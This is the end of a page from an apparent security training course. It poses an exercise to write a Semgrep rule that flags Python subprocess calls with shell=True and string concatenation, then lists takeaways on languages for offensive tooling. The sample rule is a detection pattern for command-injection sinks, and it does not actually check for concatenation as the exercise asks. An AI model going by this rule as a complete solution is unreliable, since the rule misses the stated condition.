+<p>Write a rule that finds calls to <code>subprocess.run(..., shell=True)</code> whose arguments include <code>+</code> (concatenation).</p>
+<pre><code class="language-yaml">rules:
+  - id: subprocess-shell-true-concat
+    pattern: subprocess.run(..., shell=True)
+    message: subprocess con shell=True
+    severity: WARNING
+    languages: [python]
+</code></pre>
+<h2 id="key-takeaways">Key takeaways</h2>
+<ol>
+<li><strong>Python is the lingua franca</strong> of security.</li>
+<li><strong>C is what you need to understand the underlying layers.</strong> Don't skip it.</li>
+<li><strong>Go/Rust</strong> are the future of statically compiled offensive tooling.</li>
+<li><strong>JS + C#</strong> for web and AD respectively.</li>
+<li><strong>Pwntools</strong> for CTF/exploit dev.</li>
+<li><strong>SAST/DAST/SCA</strong> are part of the modern DevSecOps process.</li>
+<li><strong>Secure coding</strong> makes you a better offensive operator (you know where to look).</li>
+</ol>
+<p>You've got the language building blocks. Now the hunt begins: OSINT, scanning, web pwn.</p>
+      <nav class="pager">
+<a href="06-os-internals.html" class="prev"><span class="label">← Previous</span><span class="title">OS internals: Linux and Windows in depth</span></a>
+<a href="08-osint-recon.html" class="next"><span class="label">Next →</span><span class="title">OSINT and reconnaissance</span></a>
+</nav>
+      <footer class="page-footer">
+        <p><strong>Cybersec Zero to Hero</strong> — built as a continuous path. Static build from Markdown.</p><p>Educational material. Everything you learn here is to be used only on systems you own, in labs, in authorized bug-bounty programs, or under signed pentest contracts. <strong>Don't break the law.</strong></p>
+      </footer>
+    </div>
+  </main>
+</div>
+<script src="../search-data.js"></script>
+<script src="../../search.js"></script>
+<script src="../../toc.js"></script>
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+  mermaid.initialize({
+    startOnLoad: true,
+    theme: 'base',
+    themeVariables: {
+      darkMode: true, background: '#131a1e', primaryColor: '#1d262b',
+      primaryTextColor: '#e8eef0', primaryBorderColor: '#00ff9c',
+      lineColor: '#00e6ff', secondaryColor: '#11171a', tertiaryColor: '#161d21',
+      mainBkg: '#1d262b', nodeBorder: '#00ff9c', clusterBkg: '#0b0f10',
+      clusterBorder: '#243035', titleColor: '#00ff9c',
+      edgeLabelBackground: '#0b0f10', textColor: '#e8eef0',
+      labelTextColor: '#e8eef0', actorBkg: '#1d262b', actorBorder: '#00ff9c',
+      actorTextColor: '#00ff9c', actorLineColor: '#00e6ff',
+      signalColor: '#e8eef0', signalTextColor: '#e8eef0',
+      labelBoxBkgColor: '#1d262b', labelBoxBorderColor: '#00ff9c',
+      noteBkgColor: '#ffe066', noteTextColor: '#0b0f10', noteBorderColor: '#ffe066',
+      activationBkgColor: '#1d262b', activationBorderColor: '#00ff9c',
+      sequenceNumberColor: '#0b0f10'
+    },
+    flowchart: { curve: 'basis', padding: 16 },
+    sequence: { mirrorActors: false, bottomMarginAdj: 10 },
+    fontFamily: 'JetBrains Mono, Cascadia Code, Consolas, monospace'
+  });
+</script>
+</body>
+</html>
